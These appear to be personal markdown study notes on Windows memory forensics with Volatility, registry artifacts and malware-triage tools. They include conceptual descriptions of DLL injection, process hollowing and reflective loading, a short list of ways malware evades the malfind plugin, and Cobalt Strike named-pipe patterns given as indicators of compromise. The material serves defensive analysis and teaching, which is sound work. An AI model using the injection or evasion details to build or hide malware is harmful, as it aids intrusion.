- Requires the system type for a memory image be specified using the --profile=[profile]
- Set environment variable
	- ```export VOLATILITY_PROFILE=Win10x64_16299```

<br>

### Image Identification
- Windows Specification Example
	- Edition: Windows 10 Pro
	- Version: 1709
	- OS Build: 16299.371
Document Version and Build During Collection
- The ```kdbgscan``` plugin can identify the build string
	- Provides Profile Suggestion, Build String, and KdCopyDataBlock
- [Volatility Profiles](https://github.com/volatilityfoundation/volatility/wiki/2.6-Win-Profiles)
- ```vol.py --info | grep Win10```
- Provide the KdCopyDataBlock to speed up runtimes
	- ```-g or --kdbg=```
	- ```vol.py -g 0xf801252197a4 --profile=Win10x64_16299 -f memory.img pslist```

<br>

**Hibernation File Conversion**
- ```imagecopy```
- Covert crash dumps and hibernation files to raw memory
- Output filename (-o)
- Provide correct image OS via (--profile=)
- Also works for VMware Snapshot and VirtualBox memory
- ```vol.py -f /memory/hiberfil.sys imagecopy -O hiberfil.raw --profile=WinXPSP2x86```

<br>

## Steps to Finding Evil 
1. Identify Rogue Processes
2. Analyze process DLLs and handles
3. Review network artifacts
4. Look for evidence of code injection
5. Check for signs of rootkit
6. Dump suspicious processes and drivers

<br>

## Identify Rogue Processes - Step 1
- Processes have a forward link (flink) and a back link (blink)
- EPROCESS block holds a majority of the metadata for a process
	- Name of process executable (image name)
	- Process Identifier (PID)
	- Parent PID
	- Location in memory (offset)
	- Creation Time
	- Termination (exit) time
	- Threads assigned to the process
	- Handles to other operating system artifacts
	- Link to the Virtual Address Descriptor tree
	- Link to the Process Environment Block

<br>

### Procces Analysis
- Image Name
	- Legitamate Process?
	- Spelled correctly?
	- Matches system context?
- Full Path
	- Appropriate path for system executable?
	- Running from a user or temp directory?
- Parent Process
	- Is the parent process what you would expect?
- Command Line
	- Executable matches image name?
	- Do arguments make sense?
- Start Time
	- Was the process started at boot (with other system processes)?
	- Process started near time of known attack
- Security IDs
	- Do the security identifiers make sense?
	- Why would a system process use a user account SID?

<br>

**Volatility Plugins**
- pslist - print all running processes within the EPROCESS doubly linked list
- psscan - scan physical memory for eprocess pool allocations
- pstree - print process list as a tree showing parent relationships (using EPROCESS linked list)
- malprocfind - automatically idetify suspicious system processes
- processbl - compare processes and loaded DLLs with a baseline image

<br>

### Pslist
- Print all running processes by following the EPROCESS linked list
- Show information for specific PIDs (-p)
- Provides the binary name (Name). parent process (PPID), and time started (Time)
- Thread (Thds) and Handle (Hnds) counts can reviewed for anomalies
- Rootkits can unlink malicous processes from the linked list, rendering them invisible to this tool
- Suspicious process (single or two lettered .exe's, mispelled system processes, system processes with incorrect PPID or didn't start at boot time)
- [Hunt Evil Poster](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Hunt_Evil_Poster.pdf) 
- [EchoTrail](https://www.echotrail.io/)

<br>

### Psscan
- Scan physical memory for EPROCESS pool allocations
- By scanning all of memory for process blocks, and not simply following the EPROCESS linked list, hidden processes may be identified
- psscan will also identify processes no loner running
- Lists:
  - Physical Offset of EPROCESS block
  - PID
  - PPID
  - Page directory base offset (PDB)
  - Process start time
  - Process exit time

<br>

### Pstree

- Print process list as a tree
- Show verbose information, including image path and commandline used for each procecss (-v)
- Very useful for visually identifying malicious processes spawned by the wrong parent process (i.e Explorer.exe as the parent of svchost.exe)
- ```pstree``` relies upon the EPROCESS linked list and hence will not show unlinked processes
- Lists:
  - Virtual offset of EPROCESS block
  - PID
  - PPID
  - Number of threads
  - Number of handles
  - Process start time
- Can output a Graphiz DOT graph
  - ```vol.py -f memory.img --profile=Win10x64_16299 pstree --output=dot --output-file=pstree.dot```  
- Convert dot file to image (SIFT)
  - ```dot -Tpng pstree.dot -o pstree.png```
- Parent Process of Interest
  - WMI Remoting - WmiPrvSE.exe/scrcons.exe (parent process of ActiveScriptEventConsumers)
  - PowerShell Remoting - Wsmprovhost.exe

### Automating Analysis with Baseline
- Compare memory objects founf in suspect image to those present in a baseline (known good) image
- Provide baseline image (-B)
- Only display items not found in baseline image (-U)
- Only display items present in the baseline (-K)
- Verbose mode (-v)
- Baseline consits of three plugins: processbl, servicebl, and driverbl
- Important information can be gleaned from items present and not present in baseline (e.g an identically named driver with a different file path in the baseline image would only be displayed using the -K option no options at all)
- [baseline.py](https://github.com/csababarta/volatility_plugins/blob/master/baseline.py)
- ```vol.py -f darkcomet.img --profile=Win7SP1x86 -B ./baseline-memory/Win7SP1x86-baseline.img processbl -U 2>error.log```
- [ANALYZING DARKCOMET IN MEMORY](http://www.tekdefense.com/news/2013/12/23/analyzing-darkcomet-in-memory.html)

  <br>

### Rogue Processes Review
- All identified processes should be sanity checked for:
  - Correct/image executable name
  - Correct file location (path)
  - Correct parent process
  - Correct command line and parameters used
  - Start time information

- Volatility provides multiple ways to review processes:
  - pslist: gives a high-level view of what is in the EPROCESS linked list
  - psscan: gives a low-level view, searching for unlinked process blocks
  - pstree: visually shows parent-processes for anomalies
  - malprocfind: scans system for processes for anomalies
  - processbl: allows comparisons with a known good baseline

<br>

## Memory Forensics - Master Process

**Compare to baseline image**
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 -B ./baseline/Win10x64.img processbl -U 2>>error.log```
- Shows processes not in baseline

**yarascan**  
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_162699 yarascan -y signature-base.yar > yarascan.txt```  
- Note interesting processes their start/exit times, PPID, and PID (included possible LOLBins)

**psscan**  
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 psscan > psscan.txt```  

**pstree**  
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 pstree > pstree.txt```  

**pstree -> dot file**  
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 pstree --output=dot --output-file=pstree.dot```  

**pstree.dot -> png file**  
- ```dot -Tpng pstree.dot -o pstree.png```  
- Note any suspicious parent to child process relationships
- Use [EchoTrail](https://www.echotrail.io/) to better understand processes

**Note times of suspicious processes - pslist**
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 pslist | grep -i rundll32 > pslist_rundll32.txt```  
- Document days and time ranges of suspicious files

**List dlls for Suspicious Executables**
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 dlllist -p 5948 > pid5948_dlllist.txt```  

**Identify SID and Account Name Used to Start Process**
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 getsids -p 8260 > pid8260_getsids.txt```  

**Identify Other Processes Tied to SID**
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 getsids | grep -i spsql >  spsql_getsids.txt```  

**Identify Files and Registries Process Interacted With**
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 handles -s -t File,Key -p 5948 > pid5948_handles_File_Key.txt```  

**Enumerate Network Connections**
- ```vol.py -f base-rd01-memory.img --profile=Win10x64_16299 netscan | egrep -i 'CLOSE|ESTABLISHED|Offset' > netscan.txt```  

**Correlate Process Data to Available Logs**
- ```grep -i WMIPrvSE psscan.txt > WMIPrvSE_psscan.txt```
- Return to your event logs and identify which WMIPrvSE process matches the time recorded for the malicious WMI event consumer in the logs

<br>

## Analyze Process Objects - Step 2
- DLLs: Dynamic Linked Libraries (shared code)
- Handles: Pointer to a resource
  - Files: Open files for I/O devices
  - Directories: List of names used for access to kernel objects
  - Registry: Access to a key within with Windows Registry
  - Mutexes/Semaphores: Control/limit access to an object
  - Events: Notifications that help threads communicate and organize
- Threads: Smallest unit of execution; the workhorse of a process
- Memory Sections: Shared memory areas used by process
- Sockets: Network port and connection information with a process

<br>

### Object Analysis Plugins
- dlllist - Print list of loaded DLLs for each process
- cmdline - Display commandline args for each process
- getsids - Print the ownership SIDs for each process
- handles - Print list of open handles for each process
- mutantscan - Scan memory of mutant objects (KMUTANT)

<br>

### dlllist
- Display the loaded DLLs and the commandline used to start each process
  - Base offset
  - DLL size
  - Load count
  - Load time (newer versions of Volatility only)
  - DLL file path
- Show information for specific IDs (-p)
- The command line displayed for the process provides full path information, including arguments provided
- LoadTime can help detect anomalies like DLL injection
- A complete list of DLLs can be too much data to review; consider limiting output to specific PIDs with the -p option
- The base offset provided can be used with the ```dlldump``` plugin to extract a specific DLL for analysis

<br>

### getsids
- Display Security Identifiers (SIDs) for each process
- Show information for specific process IDs (-p)
- Token information for a suspected process can be useful to determine how it was spawned and with that permissions
- Identifying a system process (e.g scvhost.exe) with a user SID is an important clue that something awry
- [Well Known SIDs](https://docs.microsoft.com/en-US/windows/security/identity-protection/access-control/security-identifiers)
- First line - Account SID
- Everything after - Group SID

<br>

### handles
- Also can be known as a pointer
- Print list of handles opened by the process
- Operate only on these process IDs (-p PID)
- Surpress unnamed handles (-s)
- Show only handles of a certain type (-t type)
- Each process can have hundreds or even thousands of handles; reviewing them can be like searching for a needle in a haystack
- Limit your search by looking at specific types (-t) of handles; FIle and Registry handles are excellent for quick wins
  - Process 
  - Thread
  - Key (great place to look)
  - Files (great place to look)
  - Mutant
  - Semaphore
  - Token
  - WmiGuid
  - Port
  - Directory
  - WindowsStation
  - IOCompletion
  - Timer
- ```filescan``` and ```mutantscan``` search for makers indicating FILE_OBJECTS and KMUTANT objects and return their respective results

**Named Pipes (File Handles)**
- [Named Pipes](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes)
- Designed to use SMB
- Allow multiple processes or computers to communicate with each other
- Used by psexec, cobalt strike, covenant, trickbot
- Examples (Cobalt Strike)
  - ```MSSE-####-server```
  - ```msagent_##```
  - ```status_##```
  - ```postex_ssh_####```
  - ```\\.\pipe\######```
  - postex_###

  **Mutants/Mutex**
  - Allows flow control
  - Often used by malware to mark territory
  - Identified by reverse engineers to make IOCs (unique)
  - Limits the access to a resource
  - Malware will "mark" a compromised system so it doesnt get reinfected
  - Process object

<br>

### Analyzing Process Objects Review
- Objects that make up a process will provide a clue
  - DLLs
  - Account SID
  - Handles
- Narrow focus to suspect processes or those known to be often subverted (e.g svchost.exe, services.exe, lsass.exe)
- Check process commandline, DLL files paths, and SID, and use hadnles when necessary to provide additional confirmation

<br>

## Network Artifacts - Step 3
- Suspicious ports
  - Communication via abnormal ports?
  - Indications of listening ports/backdoors?
- Suspicious Connections
  - External Connections
  - Connections to known bad IPs
  - TCP/UDP connections
  - Creation times
- Suspicious Processes
  - Why does this process have network capability (open sockets)?

**Examples**
- Any process communicating over port 80, 443, or 8080 that is not browser
- Any browser not communicating over port 80, 443, or 8080
- Connections to unexplained internal or external IP addresses
- Web requests directly to an IP address rather than a domain name
- RDP connections (port 3389), particularly if originating from odd or external IP addresses
- DNS requests for unusual domain names
- Workstation to workstaion connections

### Plugins
- XP/2003
  - connections: Print list of active, open TCP connections
  - connscan: Scan memory for TCP connections, including those closed or unlinked
  - sockets: Print list of active, available sockets (any protocol)
  - sockscan: Scan memory for sockets, including, those closed on unlinked
- Vista+
  - netscan: All of the above--scan for both connections and sockets

<br>

### netstat
- Identify network sockets and tcp structures resident in memory
- Both active (established) and terminated (closed) TCP connections may be returned
- Pay close attention to the process attached to the connection
- Does a socket or network connection for that process make?
- Creation times available for both sockets and TCP connections
- Lists:
  - Memory offset
  - Protocol
  - Local IP address
  - Remote IP address
  - State (TCP Only)
  - Process ID (PID)
  - Owner Process Name
  - Creation Time
- PowerShell uses port 5985 & 5986
- WMI uses port 135

<br>

## Evidence of Code Injection - Step 4
- Camoflauge: Use legitamite process to run
- Access to Memory and Permissions of Target
- Process Migration: Change the process its running under
- Evade A/V and Application Control
- Assist with Complex Attacks (Rootkits)
- Required administrator or debug privileges on the system
  - SeDebugPrivilege

<br>

### Code Injection
- Common with modern malware
- Built in Windows Feature
  - VirtualAllocEx()
  - CreateRemoteThread()
  - SetWindowsHookEx()
    - Hook a process's filter functions
- Reflective injection loads code without registering with host process
  - Malware creates its own loader, bypassing common API functions
  - Results in code runnind that is not registered with any host process
- Use of PowerShell-based injection is growing in popularity

### Process Hollowing
- Malware starts a suspended (not running) instance of legitimate process
- Original process code deallocated and replaced
- Can retain DLLs, handles, data, etc from original process
- Process image EXE not backed with file on disk
- [Process Hollowing Analysis](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/analyzing-malware-hollow-processes/)
- Volatility modules
  - hollowfind
  - threadmap

### DLL Injection
1. Attacker Process Attaches to Victim Process
  - OpenProcess()
2. Attacker Process Allocates an Amount of Memory in Victim Process
  - VirtualAllocEx()
3. Attacker Process Writes the Full Path of the Malicous DLL in Allocated Space
  - WriteProcessMemory()
4. Attacker Process Starts a New Thread in Victim Process
  - CreateRemoteThread()
5. Malicous DLL is Retrieved from Disk, Loaded, and Executed
  - LoadLibraryA()
- Note: There is no legitimate Windows Function to load code from anywhere but disk
- Modern systems isolate system processes from user processes
- Modern malware (Mimikatz and Meterpreter) evade by using API functions:
  - NtCreateThreadEx
  - RtlCreateUserThread

<br>

### Code Injection Plugins
- ldrmodules: Detecting unlinked DLLs and non-memory-mapped files
- malfind: Find hidden and injected code and dump affected memory sections
- hollowfind: Identify evidence of known process hollowing techniques
- threadmap: Analyze threads to identify process hollowing countermeasures
- [DETECTING DECEPTIVE PROCESS HOLLOWING](https://cysinfo.com/detecting-deceptive-hollowing-techniques/)
- [threadmap](https://github.com/kslgroup/threadmap/blob/master/threadmap%20documentation.pdf)

<br>

### ldrmodules
- DLLs are tracked in three different linked lists in the PEB for each process
- Stealthy malware can unlink loaded DLLs from these lists
- This plugin queries each list and displays the results for comparison
- Show information for specific process IDs (-p)
- Verbose: Show full paths from each of the three PEB DLL lists (-v)

**Notes**
- Normal DLLs will be in all three lists with a "True" in each column
- Legitimate entries might be missing in some of the lists
  - The process executable will no be present in the "InInit" list
  - Unloaded DLLs not yet removed from process memory
- IF an entry has no "MappedPath" information, it is indicative of a DLL not loaded using the Windows API (usually as sign of injection)

**Fields**
- Process ID
- Process Name
- Base Offset (location in memory pages)
- PEB InLoadOrderModule List ("InLoad") - Order Loaded
- PEB InInitializationOrderModule List ("InInit") - Order Initialized 
- PEB InMemoryOrderModule List ("InMem") - Order in Memory
- VAD Tree Mapped Path

**Data Sources**
- Unlinking from on or more of these lists is simple means for malware to hide injected DLLs
- Dlllist will not show unlinked DLLS
- True within a column means the DLL was present in the list
- Determine DLLs that are unlinked or suspiciously loaded
- Exe's will be missing from the InInit list
- Most DLLS are loaded from:
  - ```\Windows\System32```
  - ```\Program Files```
  - ```\Windows\WinSxS```
- .mui and .fon have same header has executable (false positve)
- Legitimate dlls can be unloaded by process (unlinked) and still show up because its being used by another process
- Volatility will show empty path when it finds an executables not mapped to disk (red flag)
- True - False - True & No mapped path usually mean process hollowing
- False - False - False & No mapped path usually sign of code injection

<br>

### Reflective Injection
- Evades using Windows Standard API
- Explicity calls LoadLibrary
- Use a custom reflective loader instead of Windows Loader
- Code is not registered in any way with the hose system, making it very difficult to detect
- Used by metasploit, Cobalt Strike, PowerSploit, Empire, and DoublePulsar
- Memory analysis is well suited for detection

**Detection**
1. Memory section marked as Page_Execute_ReadWrite
  - Identify every memory location assigned to process
  - Check permissions
2. Memory section not back with file on disk
3. Memory section contains code (PE file or shellcode)

- ```malfind``` plug in performs first two steps
- Analyst must confirm if section contains code

<br>

### malfind
- Scans process memory sections looking indications of hidden code injection
- Identified sections are extracted for further analysis
- Directory to save extracted files (--dump-dir=directory)
- Show information for specific process IDs (-p PID)
- Provide physical offset of a single process to scan (-o offset)
- Fields:
  - Name (Process Name)
  - PID (Process ID)
  - Start (Starting Offset)
  - End (Ending Offset)
  - Tag (Pool tag indicating type of memory section)
  - Hits (Number of hits from YARA signatures)
  - Protect (Memory section permissions)
    - PAGE_EXECUTE_READWRITE indicator of injection

**Notes**
- Although malfind has an impressive hit rate, false positives occur
  - Disassembled code provided can be helpful as a sanity check
- You might see multiple injected sections within the same process
- Dumped sections can reverse engineered or scanned with A/V
- Look for the 'MZ' header to confirm executable (4d 5a 90 00 or 'MZ')
- grep malfind for executables (```| grep -B4 MZ | grep Process```)
- Handling Non-MZ headers (Well known assembly code prologue present in injected memory section)
  - ```
  PUSH EBP
  MOV EBP, ESP
  ADD ESP, 0xfffffa30
  MOV ESI, [EBP+0x8]
  LEA EAX, [ESI+0x3fb]
  PUSH EAX
  PUSH 0x0
  PUSH 0x0
  CALL DWORD [ESI+0x85]
  MOV [ESI+0x8c5], EAX
```
- False Positive (Contains all or mostly 0's)
  - ```
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
  ADD [EAX], AL
```

### malfind Countermeasures
- malfind only shows a "preview" of the first 64 bytes
  - Overwrite first four bytes (MZ magic value)
  - Clear entire PE header (or first 4096)
  - Jump or redirect to code placed later in page
- ```---dump-dir``` option outputs entire contents
  1. Strings, scan with YARA signatures, AV scan
  2. Have a reverse engineer validate the code

## Hooking and Rootkit Detection - Step 5

### Rootkit Hooking
- System Service Descriptor Table (SSDT)
  - Kernel Instruction Hooking
  - Every SSDT entry will point to a instructions in either the system kernel (ntoskrnl.exe) or the GUI driver (win32k.sys)
- Interrupt Descriptor Table (IDT)
  - IDT maintains a table of addresses to functions handling interrupts and exceptions
  - Kernel Hooks; not very common on modern systems
- Import Address Table (IAT) and Inline API
  - User-mode DLL function hooking
  - Volatility ```apihooks``` module is best for identifying
- I/O Request Packets (IRP)
  - Driver hooking
  - How OS processes interact with hardware drivers

<br>

### Plugins
- ssdt: Display SSDT entries
- psxview: Find hidden processes via cross-view techniques
- modscan: Find modules via pool tag scanning
- apihooks: Find DLL function (inline and trampoline) hooks
- driverirp: Identify I/O Packets (IRP) hooks
- idt: Display Interrupt Descriptor Table Hooks

<br>

### ssdt
- Display hooked functions within the System Service Descriptor table (Windows Kernel Hooking)
- The plugin displays every SSDT table entry
- Eliminate legitimate entries pointing within ntoskrnl.exe and win32k.sys
  - ```| egrep -v '(ntoskrnl\.exe | win32k\.sys)'``` or ```| egrep -v '(ntoskrnl|win32k)'```
- Also attempts to discover new tables added by malware

<br>

### Direct Kernel Object Manipulation
- DKOM is an advanced process hiding technique
  - Unlink an EPROCESS from the doubly linked list
- Tools like ```tasklist.exe``` and ```pslist.exe``` on a live system are defeated by DKOM
- Use ```psscan```

### psxview
- Performs a cross-view analysis using seven different process listing plugins to visually identify hidden processes
- Limit false positives by using "known good rules" -R
- It's important to know the idiosyncrasies of each source:
  - An entry not found by ```pslist``` could be exited or hidden
  - Processes run early in boot cycle like smss.exe and csrss.exe will not show in ```csrss``` column
  - Processes run before smss.exe will not show in ```session``` and ```deskthrd``` columns
  - Terminated processes might show only in ```psscan``` column
  - If using "-R", well-known anomalies will be marked "Okay"

### modscan and modules
- modules lists modules while modscan scans for them (similar to pslist and psscan)
- Walked link list to identify kernel drivers loaded (modules)
- Scan memory image to find loaded, unloaded, and unlinked kernel modules (modscan plugin)
- Provides a list of loaded drivers, their size and location
- Drivers are a common means for malware to take control; loading a driver gives complete access to kernel objects
- Identifying a bad driver amoung hundreds of others can be hard; other information like hooks and a baseline might help
- Two main way to install rootkit: exploit (rare) or driver (common)

**Notes**
- Automating analysis (baseline plugin)
  - ```vol.py driverbl -f TDSS.img -B baseline.img -U```

<br>

### apihooks - Inline DLL Hooking
- Detect inline and Import Address Table function hooks used by rootkits to modify and control information returned
- Operate only on these PIDs (-p PID)
- Skip kernel mode checks (-R)
- Scan only critical processes and dlls (-Q)

**Notes**
- A large number of legitimate hooks can exist; weeding them out take practice and an eye for looking for anomalies
- This plugin can take a long time to run due to the sheer number of locations it must query--be patient
- Now supports x86 and x64 memory images

### Trampoline Hooking
- Indicators
  - ```Hooking module: <unkown>``` (not mapped to disk)
  - Disassembly contains ```JMP <Hook Address>```

<br>

## Dump Suspicious Processes and Drivers - Step 6

### Plugins
- dlldump: Dump DLLs from a process
- moddump: Dump a kernel driver to an executable file sample
- procdump: Dump a process to an execuable file sample
- memdump: Dump all addressable memory for a process into one file
- cmdscan: Scan for COMMAND_HISTORY buffers
- consoles: Scan for CONSOLE_INFORMATION output
- dumpfiles: Extract files by name or physical offset
- filescan: Scan memory for FILE_OBJECTs
- shimcachemem: Extract Application Compatibility Cache artifacts from memory

### dlldump
- Extract DLL files belonging to a specific process or group of processes
- Directory to save extracted files (--dump-dir=directory)
- Dump only from these PIDs (-p PID)
- Dump DLL located at a specifc base offset (-b offset)
- Dump DLLs matching a REGEX name pattern (-r regex)

**Notes**
- Use -p and the -b or -r options to limit the number of DLLs extracted
- Many processes point to the same DLLs, so you might encounter multiple copies of the same DLL extracted

<br>

### moddump
- Used to extract kernel drivers from a memory image
- Directory to save extracted files (--dump-dir=directory)
- Dump drivers matching a REGEX name pattern (-r regex)
- Dump driver using offset (-b module base address)
- Use -r or -b options to limit the number of drivers extracted (all kernel drivers dumped by default)
- Find the driver offset using modules or modscan
- ```vol.py -f memory.img moddump -b 0xf7c24000 --dump-dir=./output```

<br>

### procdump
- Dump a process to an executable memory sample
- Directory to save extracted files (--dump-dir=directory)
- Dump only these processes (-p PID)
- Specify process by specific offset (-o offset)
- Use regular expression to specify process (-n regex)

**Notes**
- When dumping all processes, the EPROCESS doubly linked list is used (will not dump terminated or unlinked processes)
  - Use the offset (-o option) to dump unlinked processes
- Not all processes will be "paged in" to memory -> an error is provided if the process is not memory resident

<br>

### memdump
- Dump every memory section owned by a process into a single file
- Direcotry to save extracted files (--dump-dir=directory)
- Operate only on these PIDs (-p PID)
- Use regular expression to specify process (-n regex)

**Note**
- Use the -p option to limit the number of processes extracted
- The resulting dump file will be much larger than just the process; it contains every memory section owned by the process
- String analysis of the dump can idenitify data items like domain names, IP addresses, and passwords
- vaddump is similar but dumps every section to a separate file

<br>

### strings
- Valuable information
  - IP addresses/domain names
  - Malware filenames
  - Internet markers (e.g http://, https://, ftp://)
  - Usernames/email addresses
- Output
  - Byte offset and string
  - Byte offset used to calculate cluster location

**Notes**
- Use -t d option in order to get the exact byte offset
- Strings of interests and their offset can be used to correlate and determine context
- Run once for unicode strings (-e l) and once for ASCII
  - Files can be combined into single file (example conhost)

```bash
vol.py -f memory.img memdump -n conhost --dump-dir=.
```  

```bash
strings -a -t d file > strings.asc
strings -a -t d -e l file >> strings.uni
```  
or

```bash
strings -a -t d file > strings.txt
strings -a -t d -e l file >> strings.txt
sort strings.txt > sorted_strings.txt  
```  
- Alternative for Windows: bstrings.exe

<br>

### grep
- -i ignore case
- -A Num print Num lines AFTER pattern match
- -B Num pring Num lines BEFORE pattern match
- -f filename: file with lost of words (Dirty Word List)

```bash
grep -i "command prompt" conhost.uni
```  

### cmdscan and consoles
- Scan csrss.exe (XP) and conhost.exe (Win7) for Command_History and Console_Information residue
- Gathering command history and console output can give insight into user/attacker activities
- ```cmdscan``` provides information from the command history buffer
- ```consoles``` prints commands (inputs) + screen buffer (outputs)
- Plugins can identify info from active and closed sessions

<br>

### Windows 10 Memory Compression
- Win 10 has also implemented compression for the pagefile as well as in frequently used areas of RAM
- ```win10memcompression.py```
  - Addition to the volatility project
  - Facilitates decompression as compressed pages of memory are detected
  - Can take advantage of Volatility plugins

<br>

### dumpfiles
- Dump File_Objects from memory
- Directory to save extracted files (-D or --dump-dir=)
- Extract using physical offset of File_Object (-Q)
- Extract using regular expression (-r) (add -i for case sensitive)
- Use original filename in output
- Use -n to use original name in output

**Notes**
- Extract documents, logs, executables, and even removable media files
- The ```filescan``` plugin is particulary complementary with ```dumpfiles```  
- No guarantees. References to files may be identified via ```handles``` , ```vadinfo```, and ```filescan```, but files may not be cached

```bash
vol.py -f memory.img dumpfiles -n -i -r \\.exe --dump-dir=./output
```

<br>

### filescan
- Scan for File_Objects in memory

**Notes**
- Returns the physical offset where a File_Object exists
- Identifies files in memory even if there are no handles (closed files)
- Finds NTFS special files (such as $MFT) that are not present in the VAD tree or process handles lists
- ```filescan``` is particularly complementary with ```dumpfiles```  

```bash
vol.py -f memory.img filescan
voly.py -f memory.img dumpfiles -n -Q 0x09135278 --dump-dir=.
```

<br>

### Registry Artifacts - shimcachemem
- Parses the Application Compatibility ShimCache from kernel memory
- --output=csv
- --output-file=filename
- -c, --clean_file_paths: replace path prefixes with C:

**Notes**
- Shimcache is only written to the registry upon a reboot or shutdown
- One of the only tools available to extract cached ShimCache entires directly from kernel memory without requiring a system shutdown
- Contents will often include data not yet written to the registry

<br>

### Extracted File Analysis
- AV scannning
- Malware Sandbox
- Dynamic Analysis
- Static malware debugging and disassembly

<br>

### Live Analysis
- [Get-InjectedThread](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
- [Kansa Get-InjectedThreads.ps1](https://github.com/davehull/Kansa/blob/master/Modules/Process/Get-InjectedThreads.ps1)
- [hollows_hunter](https://github.com/hasherezade/hollows_hunter/wiki)
- [GRR Rapid Response](https://grr-doc.readthedocs.io/en/v3.4.2.4/release-notes.html)
- [Velociraptor](https://github.com/Velocidex/velociraptor)
- [Veloxity Volcano](https://www.volexity.com/products-overview/volcano/)

<br>

---

<br>

# Windows Forensics

## SANS Windows Forensic Analysis Poster
* [Link](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Windows_Forensics_Poster.pdf)

<br>

## Registy Overview

**System  Registry Hives**

- %WinDIr%\System32\Config
	- SAM
		- Info about user accounts
		- Password last changed
		- Last logon
		- In user accounts
	- Security
		- Access Control list
		- Stored passwords
	- System
		- Configuration data (hardware)
	- Software
		- Configuration data (software/os)
	- Default
		- Not much of use

**User Registry Hives**

- %UserProfile%
	- NTUSER.DAT
	- Most recently used files
	- Last files searched for
	- Last typed URLs
	- Last commands executed
	- Opened Files
	- Last Saved Files

- %UserProfile%\AppData\Local\Microsoft\Windows\
	- USRCLASS.DAT
	- Program Execution
	- Opened and closed folders
	- Aids User Account Control (UAC)
	- HKCU\Software\Classes

- %WinDir%\appcompat\Programs
	- AMCACHE.hve
	- Excecution data

<br>

## Users and Groups

- SAM\Domains\Account\Users\
- Username
- Relative Identifier
- User Login Information
	- Last Login
	- Last Failed Login
	- Logon Count
	- Password Policy
	- Account Creation Time
- Group Information
	- Administrators
	- Users
	- Remote Desktop Users

<br>

## System Configuration

**Identify Current Control Set**
- SYSTEM\Select
- Systems Configuration Settings
- Identify what ControlSet is in use
		
**Identify Microsoft OS Version**
- MS Windows Version
	- ProductName
	- ReleaseID (YYMM)
- Service Pack Level
- Install Date of the last version/major update
	- InstallDate
- SOFTWARE\Microsoft\Windows NT\CurrentVersion
		
**Computer Name**
- SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName
- Name linked to log files, network connections
- Verify the PC that is being examined
	
**Time Zone of the Machine**
- System\CurrentControlSet\Control\TimeZoneInformation
- Correlation Activity
- Log Files\TimeStamps

**Network Interfaces**
- SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces
- Static or DHCP
- Ties machines to network activity
- Interface GUID for additional profiling
	
**Historical Networks**
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Managed
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Nla\Cache
- Identify Networks Computer has been connected to
- Could be wired or wireless
- Domain/intranet Name
- Identify SSID
- Identify Gateway MAC Address
- First and Last Time network connection was made
- Networks that have been connected to via VPN
- MAC address of SSID for Gateway can be physically triangulated
- Write Down ProfileGUID

**Network Types**
- SOFTWARE\Microsoft\WZCSVC\Parameters\Interfaces\{GUID} (XP)
- SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles (Win7-10)
- ID the type of network that the computer connected to
- ID wireless SSIDs that the computer previously connected to
	- ProfileName
- Time is recorded in LOCAL TIME, NOT UTC
- First and Last Connection Time
	- DateCreated
	- DateLastConnected
- Determine Type using Nametype
	- 6 (0x06) = Wired
	- 23 (0x17) = VPN
	- 71 (0x47) = Wireless
	- 243 (0xF3) = Mobile Broadband
- Network Category
	- Category
	- (Public) 0 - Sharing Disabled
	- (Private) 1 - Home, Sharing Enabled
	- (Domain) 2 - Work, Sharing Enabled
- Geolocate
	- Wigle.net
	
**System AutoStart Programs**
- Programs exhibiting persistence
	- User login
	- Boot time
- NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
- NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
- Software\Microsoft\Windows\CurrentVersion\RunOnce
- Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run
- Software\Microsoft\Windows\CurrentVersion\Run
- (Services) SYSTEM\CurrentControlSet\Services
- IF start set to 0x02, then service application will start at boot (0x00 for drivers)(
- Determine programs that start automatically
- Useful for finding malware on a machine that installs on boot such as a rootkit
- Look at when the time key was last updated; generally last boot time of the system
	
**Last Shutdown Time**
- Discover when the system was last shutdown
- How many successful times the system was shutdown
- SYSTEM\CurrentControlSet\Control\Windows (Shutdown Time)
- SYSTEM\CurrentControlSet\Control\Watchdog\Display (Shutdown Count) - XP only
- Detect certain types of activity
- Determine if the user properly shuts down their machine


<br>

---

<br>

# Malware Discovery

### YARA
- Search for string and header based signatures
- Standard IOC sharing
- Easy to create custom signatures to detect new tools/malware
- [YARA](http://virustotal.github.io/yara/)
- Compile multiple rule files with yarac64.exe

```bash
yara64.exe -C compiled-rules-file <file or directory>
```

<br>

### Sigcheck
- Microsoft tool designed to validate digital signatures
- Create file hashes
- Virus Total Support

```bash
sigcheck -c -e -h -v <dir-of-exe> > sigcheck-results.csv
```  

<br>

### DensityScout
- Checks for possible obfuscation and packing
- Files receive an entropy score
- Score can be used to idenitify whether a set of files further investigation
- [DensityScout](https://www.cert.at/en/downloads/software/software-densityscout)

```bash
densityscout -pe -r -p 0.1 -o results.txt <directory-of-exe>
```  

<br>

### capa
- File capability identification
- Anti-analysis features?
- Contains and embedded.exe?
